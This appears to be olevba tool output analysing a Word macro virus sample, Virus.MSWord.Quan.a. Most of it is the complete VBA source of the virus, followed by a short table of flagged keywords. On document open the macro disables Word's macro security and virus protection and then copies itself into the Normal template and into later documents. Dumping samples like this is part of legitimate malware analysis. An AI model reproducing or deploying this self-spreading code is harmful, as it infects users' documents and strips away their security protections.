olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Quan.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Quan.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SkyQuaintez.bas 
in file: Virus.MSWord.Quan.a - OLE stream: 'Macros/VBA/SkyQuaintez'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'By Jonathan_Press
'Thanks to LBL85 for letting mr love you
Status = System.PrivateProfileString("", "HKEY_CURRENT_USER", "Sky")
If Status < "0" Then GoTo JustFly
If Status >= "0" Then GoTo Flying

JustFly:
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
  CommandBars("Macro").Controls("Security...").Enabled = False
  System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
  CommandBars("Tools").Controls("Macro").Enabled = False
  Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If

Counts1 = NormalTemplate.VBProject.VBComponents.Count
For co1 = 1 To Counts1
If NormalTemplate.VBProject.VBComponents.Item(Counts1).Name = "SkyQuaintez" Then End
Next co1
    
    Application.OrganizerCopy Source:= _
        ActiveDocument.FullName, _
         Destination:=NormalTemplate.FullName, Name:="SkyQuaintez", Object:= _
        wdOrganizerObjectProjectItems

System.PrivateProfileString("", "HKEY_CURRENT_USER", "Sky") = "0"
End

Flying:
CountsCopier = NormalTemplate.VBProject.VBComponents.Count
For cou = 1 To CountsCopier
If NormalTemplate.VBProject.VBComponents.Item(CountsCopier).Name = "SkyQuaintez" Then SkyQuaintezLocation = CountsCopier
CountsCopier = CountsCopier - 1
Next cou

System.PrivateProfileString("", "HKEY_CURRENT_USER", "Sky") = System.PrivateProfileString("", "HKEY_CURRENT_USER", "Sky") + 1

Counts2 = ActiveDocument.VBProject.VBComponents.Count
For co2 = 1 To Counts2
If ActiveDocument.VBProject.VBComponents.Item(Counts2).Name = "SkyQuaintez" Then End
Next co2

NormalTemplate.VBProject.VBComponents.Item(SkyQuaintezLocation).Export "c:\SkyQuaintez.sky"
ActiveDocument.VBProject.VBComponents.Import "c:\SkyQuaintez.sky"
Kill "c:\SkyQuaintez.sky"

End
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

